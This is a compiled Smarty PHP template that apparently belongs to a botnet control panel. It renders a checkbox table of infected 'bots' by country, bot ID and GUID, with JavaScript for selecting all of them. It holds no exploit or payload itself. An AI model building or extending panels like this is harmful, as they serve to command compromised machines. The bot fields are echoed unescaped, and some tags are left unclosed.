<?php /* Smarty version Smarty-3.0.6, created on 2011-02-19 20:41:28
         compiled from "/var/www/maincp/client/templates/select_bots.tpl" */ ?>
<?php /*%%SmartyHeaderCode:11526738794d602af86912f8-66355932%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'd681ae5fcb43fd41003518114c63e85f777eb567' => 
    array (
      0 => '/var/www/maincp/client/templates/select_bots.tpl',
      1 => 1298140120,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '11526738794d602af86912f8-66355932',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<td colspan='5'>
<form id='frm_bots'>
<hr color="#dddddd" size="1">
<center>
	&nbsp;<a href="javascript:void(0)" onClick="CheckAll2('bots', true);">Select All</a> &nbsp;&nbsp;
	<a href="javascript:void(0)" onClick="CheckAll2('bots', false);">Unselect All</a
	
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);" border="1" cellpadding="3" cellspacing="0" width="500">
<th style='width:30px;'>#</th><th style='width:40px;'>Country</th><th style='width:40px;'>BOT ID</th><th>GUID</th><th style='width:20px;'></th>

<?php  $_smarty_tpl->tpl_vars['BOT'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('BOTS')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
 $_smarty_tpl->tpl_vars['smarty']->value['foreach']['bloop']['iteration']=0;
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['BOT']->key => $_smarty_tpl->tpl_vars['BOT']->value){
 $_smarty_tpl->tpl_vars['smarty']->value['foreach']['bloop']['iteration']++;
?>
	<tr id='tr<?php echo $_smarty_tpl->tpl_vars['BOT']->value['id_bot'];?>
'><td style='text-align:center;'><?php echo $_smarty_tpl->getVariable('smarty')->value['foreach']['bloop']['iteration'];?>
</td>
	<td style='text-align:center;'><img src='img/flags/<?php echo $_smarty_tpl->tpl_vars['BOT']->value['CCODE'];?>
.gif'</td>
	<td style='text-align:center;'><?php echo $_smarty_tpl->tpl_vars['BOT']->value['id_bot'];?>
</td>
	<td style='text-align:center;'><?php echo $_smarty_tpl->tpl_vars['BOT']->value['guid_bot'];?>
</td>
	<td style='text-align:center;'><input type='checkbox' style='margin:0px;' name='bots[<?php echo $_smarty_tpl->tpl_vars['BOT']->value['id_bot'];?>
]' checked></td>
	</tr>
<?php }} else { ?>
	<tr><td colspan='5' align='center' class='error'>There are no bots for this query!</td></tr>
<?php } ?>
</table>
</form>
</td>


<script>
function CheckAll2(name, checked) 
{
	f = document.getElementById('frm_bots');
	for (var i = 0; i < f.elements.length; i++) 
	{
		if(f.elements[i].type == 'checkbox' && f.elements[i].name.substr(0, name.length) == name)
		{
			f.elements[i].checked = checked;
		}
	}
}
</script>
